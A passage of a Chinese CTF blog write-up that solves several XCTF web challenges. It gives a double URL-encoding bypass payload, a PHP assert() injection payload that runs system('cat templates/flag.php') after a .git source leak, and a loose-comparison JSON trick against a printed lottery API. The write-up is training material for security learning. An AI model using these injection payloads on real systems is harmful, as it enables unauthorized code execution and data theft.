+<p>urldecode(id)==admin，得到flag</p>
+<p>但是当执行if($_GET[id] == “admin”)时，id就会被url解码一次，所以这题考的是url二次编码绕过</p>
+<p>payload：<code>?id=%25%36%31%25%36%34%25%36%44%25%36%39%25%36%45</code>(这一串是admin的url二次编码，其实转一个字符就行)</p>
+<h4 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h4><p>拿到题目是一个网站，查看源码</p>
+<p><img src="https://s2.ax1x.com/2019/05/23/VCUwin.png" alt="VCUwin.png"></p>
+<p>发现一个page=flag，访问之后没啥用</p>
+<p><img src="https://s2.ax1x.com/2019/05/23/VCUgZ4.png" alt="VCUgZ4.png"></p>
+<p>提示信息里提到git，想到**.git**泄露，扫描一下网站</p>
+<p><img src="https://s2.ax1x.com/2019/05/23/VCUqdH.png" alt="VCUqdH.png"></p>
+<p>确实存在**.git**泄露，用git下载工具在下载来</p>
+<p><img src="https://s2.ax1x.com/2019/05/23/VCdJEQ.png" alt="VCdJEQ.png"></p>
+<p>但是flag.php的内容是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// TODO</span></span><br><span class="line"><span class="comment">// $FLAG = &#x27;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>感觉没什么用啊，</p>
+<p>但是查看下载的文件的源码的过程中，发现index.php的源码中有这样的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里看到了assert()函数，让我们想到了命令执行，而且page的参数没有进行任何过滤</p>
+<p>strpos()是匹配两个字符串的，具体可以百度。</p>
+<p>那我们就可以利用assert命令执行来查看flag的内容了payload：<code>?page=1&#39;,&#39;2&#39;) === false and system(&#39;cat templates/flag.php&#39;) and strpos(&#39;templates/flag</code></p>
+<p>拼接后完整的语句是</p>
+<p>assert(“strpos(‘templates/1’, ‘2’) === false and system(‘cat templates/flag.php’) and strpos(‘templates/flag.php’) or die(“Detected hacking attempt!”);</p>
+<p><strong>strpos(‘templates/1’, ‘2’) === false</strong>结果为真，and连接**system(‘cat templates/flag.php’)**会执行，然后再执行strpos(‘templates/flag.php’)，</p>
+<p>个人理解，不对的话请指正。</p>
+<h4 id="Lottery"><a href="#Lottery" class="headerlink" title="Lottery"></a>Lottery</h4><p>上来先测试了一下，注册用户，购买彩票，拿到足够的钱，购买flag。大概就这样，发现buy.php页面，买完之后还是buy.php，没有页面的跳转，这让我有点搞不懂。</p>
+<p>所以扫了一下网站，发现有robots.txt，访问发现</p>
+<p><img src="https://s2.ax1x.com/2019/05/23/VPp3sH.png" alt="VPp3sH.png"></p>
+<p>似乎也是Git泄露问题，下载一下试试，拿到很多文件</p>
+<p><img src="https://s2.ax1x.com/2019/05/23/VPpBQg.png" alt="VPpBQg.png"></p>
+<p>发现关键代码在api.php里面</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">header(<span class="string">&#x27;Content-Type: application/json&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">response</span>(<span class="params"><span class="variable">$resp</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">die</span>(json_encode(<span class="variable">$resp</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">response_error</span>(<span class="params"><span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$result</span> = [<span class="string">&#x27;status&#x27;</span>=&gt;<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">	<span class="variable">$result</span>[<span class="string">&#x27;msg&#x27;</span>] = <span class="variable">$msg</span>;</span><br><span class="line">	response(<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">require_keys</span>(<span class="params"><span class="variable">$req</span>, <span class="variable">$keys</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">foreach</span> (<span class="variable">$keys</span> <span class="keyword">as</span> <span class="variable">$key</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(!array_key_exists(<span class="variable">$key</span>, <span class="variable">$req</span>))&#123;</span><br><span class="line">			response_error(<span class="string">&#x27;invalid request&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">require_registered</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>]))&#123;</span><br><span class="line">		response_error(<span class="string">&#x27;register first&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">require_min_money</span>(<span class="params"><span class="variable">$min_money</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>]))&#123;</span><br><span class="line">		response_error(<span class="string">&#x27;register first&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$money</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$money</span> &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="variable">$_SESSION</span> = <span class="keyword">array</span>();</span><br><span class="line">		session_destroy();</span><br><span class="line">		response_error(<span class="string">&#x27;invalid negative money&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$money</span> &lt; <span class="variable">$min_money</span>)&#123;</span><br><span class="line">		response_error(<span class="string">&#x27;you don\&#x27; have enough money&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] != <span class="string">&#x27;POST&#x27;</span> || !<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;CONTENT_TYPE&quot;</span>]) || <span class="variable">$_SERVER</span>[<span class="string">&quot;CONTENT_TYPE&quot;</span>] != <span class="string">&#x27;application/json&#x27;</span>)&#123;</span><br><span class="line">	response_error(<span class="string">&#x27;please post json data&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = json_decode(file_get_contents(<span class="string">&#x27;php://input&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span>(json_last_error() != JSON_ERROR_NONE)&#123;</span><br><span class="line">	response_error(<span class="string">&#x27;invalid json&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">require_keys(<span class="variable">$data</span>, [<span class="string">&#x27;action&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// my boss told me to use cryptographically secure algorithm </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_num</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="variable">$byte</span> = openssl_random_pseudo_bytes(<span class="number">10</span>, <span class="variable">$cstrong</span>);</span><br><span class="line">		<span class="variable">$num</span> = ord(<span class="variable">$byte</span>);</span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="variable">$num</span> &gt;= <span class="number">250</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="variable">$cstrong</span>)&#123;</span><br><span class="line">		response_error(<span class="string">&#x27;server need be checked, tell admin&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$num</span> /= <span class="number">25</span>;</span><br><span class="line">	<span class="keyword">return</span> strval(floor(<span class="variable">$num</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_win_nums</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">7</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">		<span class="variable">$result</span> .= random_num();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buy</span>(<span class="params"><span class="variable">$req</span></span>)</span>&#123;</span><br><span class="line">	require_registered();</span><br><span class="line">	require_min_money(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$money</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>];</span><br><span class="line">	<span class="variable">$numbers</span> = <span class="variable">$req</span>[<span class="string">&#x27;numbers&#x27;</span>];</span><br><span class="line">	<span class="variable">$win_numbers</span> = random_win_nums();</span><br><span class="line">	<span class="variable">$same_count</span> = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">7</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$numbers</span>[<span class="variable">$i</span>] == <span class="variable">$win_numbers</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">			<span class="variable">$same_count</span>++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">switch</span> (<span class="variable">$same_count</span>) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">5</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">20</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">300</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">1800</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">200000</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">5000000</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="variable">$prize</span> = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$money</span> += <span class="variable">$prize</span> - <span class="number">2</span>;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>] = <span class="variable">$money</span>;</span><br><span class="line">	response([<span class="string">&#x27;status&#x27;</span>=&gt;<span class="string">&#x27;ok&#x27;</span>,<span class="string">&#x27;numbers&#x27;</span>=&gt;<span class="variable">$numbers</span>, <span class="string">&#x27;win_numbers&#x27;</span>=&gt;<span class="variable">$win_numbers</span>, <span class="string">&#x27;money&#x27;</span>=&gt;<span class="variable">$money</span>, <span class="string">&#x27;prize&#x27;</span>=&gt;<span class="variable">$prize</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"><span class="variable">$req</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$flag_price</span>;</span><br><span class="line"></span><br><span class="line">	require_registered();</span><br><span class="line">	<span class="variable">$money</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$money</span> &lt; <span class="variable">$flag_price</span>)&#123;</span><br><span class="line">		response_error(<span class="string">&#x27;you don\&#x27; have enough money&#x27;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$money</span> -= <span class="variable">$flag_price</span>;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>] = <span class="variable">$money</span>;</span><br><span class="line">		<span class="variable">$msg</span> = <span class="string">&#x27;Here is your flag: &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line">		response([<span class="string">&#x27;status&#x27;</span>=&gt;<span class="string">&#x27;ok&#x27;</span>,<span class="string">&#x27;msg&#x27;</span>=&gt;<span class="variable">$msg</span>, <span class="string">&#x27;money&#x27;</span>=&gt;<span class="variable">$money</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$req</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$name</span> = <span class="variable">$req</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$name</span>;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;money&#x27;</span>] = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">	response([<span class="string">&#x27;status&#x27;</span>=&gt;<span class="string">&#x27;ok&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$data</span>[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;buy&#x27;</span>:</span><br><span class="line">		require_keys(<span class="variable">$data</span>, [<span class="string">&#x27;numbers&#x27;</span>]);</span><br><span class="line">		buy(<span class="variable">$data</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;flag&#x27;</span>:</span><br><span class="line">		flag(<span class="variable">$data</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;register&#x27;</span>:</span><br><span class="line">		require_keys(<span class="variable">$data</span>, [<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">		register(<span class="variable">$data</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		response_error(<span class="string">&#x27;invalid request&#x27;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>阅读源码我们发现，</p>
+<blockquote>
+<p>requests是json格式的</p>
+<p>比较彩票数字与用户数字采用==弱比较</p>
+<p>而且是一位一位的比较的</p>
+</blockquote>
+<p>通过以上三点，我们就可以操作一下了，</p>
+<p>由于使用的是PHP 弱类型比较，<code>TRUE</code>,<code>1</code>,<code>&quot;1&quot;</code>都相等相等，即true与字符串和数字都是弱相等的。而且，由于 json 支持布尔型数据，那么就可以构造一串数组[true,true,true,true,true,true,true]传入了，</p>
+<p>bp抓包，然后构造数组，即可得到5000000，再来一次就是10000000，可以购买flag了</p>
+<p><img src="https://s2.ax1x.com/2019/05/23/VPPPRf.png" alt="VPPPRf.png"></p>
+<p><img src="https://s2.ax1x.com/2019/05/23/VPPtoR.png" alt="VPPtoR.png"></p>
+<h4 id="FlatScience"><a href="#FlatScience" class="headerlink" title="FlatScience"></a>FlatScience</h4><p>一通乱点，要么是转到PDF文件，要么是几个页面来回跳转，无奈，，</p>
+<p>看看robots.txt，发现有login.php和admin.php，两个登录界面</p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/ctf/">ctf</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/ctf/">ctf</a><a href="/tags/攻防世界xctf-web/">攻防世界xctf-web</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://example.com/2019/04/18/%E5%A4%A7%E5%AD%A6CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cxctf%E4%B9%8Bweb/" data-title="攻防世界xctf之web | Hexo" data-tsina="" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2019/04/23/大学CTF/第十二届全国大学生安全竞赛/" title="第十二届全国大学生安全竞赛">
+  <strong>上一篇：</strong><br/>
+  <span>
+  第十二届全国大学生安全竞赛</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2019/04/14/大学CTF/南邮Crypto/"  title="南邮Crypto">
+ <strong>下一篇：</strong><br/> 
+ <span>南邮Crypto
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E6%96%87"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0"><span class="toc-number">2.1.</span> <span class="toc-text">新手练习</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#view-source"><span class="toc-number">2.1.1.</span> <span class="toc-text">view_source</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#get-post"><span class="toc-number">2.1.2.</span> <span class="toc-text">get_post</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#robots"><span class="toc-number">2.1.3.</span> <span class="toc-text">robots</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#backup"><span class="toc-number">2.1.4.</span> <span class="toc-text">backup</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cookie"><span class="toc-number">2.1.5.</span> <span class="toc-text">cookie</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#disable-button"><span class="toc-number">2.1.6.</span> <span class="toc-text">disable_button</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#simple-js"><span class="toc-number">2.1.7.</span> <span class="toc-text">simple_js</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xff-referer"><span class="toc-number">2.1.8.</span> <span class="toc-text">xff_referer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#weak-auth"><span class="toc-number">2.1.9.</span> <span class="toc-text">weak_auth</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#webshell"><span class="toc-number">2.1.10.</span> <span class="toc-text">webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#command-execution"><span class="toc-number">2.1.11.</span> <span class="toc-text">command_execution</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#simple-php"><span class="toc-number">2.1.12.</span> <span class="toc-text">simple_php</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6"><span class="toc-number">2.2.</span> <span class="toc-text">高手进阶</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Training-WWW-Robots"><span class="toc-number">2.2.1.</span> <span class="toc-text">Training-WWW-Robots</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unserialize3"><span class="toc-number">2.2.2.</span> <span class="toc-text">unserialize3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#hacker-news"><span class="toc-number">2.2.3.</span> <span class="toc-text">hacker news</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#upload"><span class="toc-number">2.2.4.</span> <span class="toc-text">upload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Confusion1"><span class="toc-number">2.2.5.</span> <span class="toc-text">Confusion1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ics-06"><span class="toc-number">2.2.6.</span> <span class="toc-text">ics-06</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#upload-1"><span class="toc-number">2.2.7.</span> <span class="toc-text">upload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mfw"><span class="toc-number">2.2.8.</span> <span class="toc-text">mfw</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Lottery"><span class="toc-number">2.2.9.</span> <span class="toc-text">Lottery</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FlatScience"><span class="toc-number">2.2.10.</span> <span class="toc-text">FlatScience</span></a></li></ol></li></ol></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/CTF/" title="CTF">CTF<sup>10</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/IoT/" title="IoT">IoT<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Linux/" title="Linux">Linux<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Other/" title="Other">Other<sup>24</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/SQL/" title="SQL">SQL<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Sec/" title="Sec">Sec<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/ctf/" title="ctf">ctf<sup>21</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/ctf/" title="ctf">ctf<sup>21</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/buuctf/" title="buuctf">buuctf<sup>6</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Java/" title="Java">Java<sup>5</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SQLi/" title="SQLi">SQLi<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SQL/" title="SQL">SQL<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Linux/" title="Linux">Linux<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/PHP绕过/" title="PHP绕过">PHP绕过<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/MYSQL比较特性/" title="MYSQL比较特性">MYSQL比较特性<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SSRF/" title="SSRF">SSRF<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/java-WEB-INF/" title="java-WEB-INF">java-WEB-INF<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/无参数RCE/" title="无参数RCE">无参数RCE<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/模板注入/" title="模板注入">模板注入<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/MISC/" title="MISC">MISC<sup>1</sup></a></li>
+			
+		
+			
